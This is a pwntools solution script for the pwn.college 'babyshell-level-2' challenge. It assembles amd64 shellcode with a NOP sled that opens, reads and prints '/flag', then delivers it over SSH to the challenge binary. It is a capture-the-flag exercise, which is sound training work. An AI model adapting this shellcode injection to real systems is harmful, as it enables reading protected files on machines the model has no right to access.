from pwn import *

context.arch='amd64'
context.os='linux'

asm_code='''
    .rept 2048
    nop
    .endr
    mov rax, 0x00000067616c662f         
    push rax                            

    mov rdi, rsp                                   
    mov rsi, 0                          
    mov rax, 2                          
    syscall

    mov rdi, rax                        
    mov rsi, rsp                        
    mov rdx, 1000                       
    mov rax, 0                          
    syscall

    mov rdi, 1                          
    mov rsi, rsp                        
    mov rdx, rax                        
    mov rax, 1                          
    syscall

    mov rdi, 42                         
    mov rax, 60                         
    syscall
'''

shellcode=asm(asm_code)
print(shellcode)
FILE="/challenge/babyshell-level-2"
HOST='pwn.college'
username='hacker'
password='password'
port=22

ssh_connection=ssh(user=username, host=HOST, port=port, password=password)

process=ssh_connection.process(FILE)

process.recvuntil("Reading 0x1000 bytes from stdin.")
process.sendline(shellcode)
process.interactive()
ssh_connection.close()
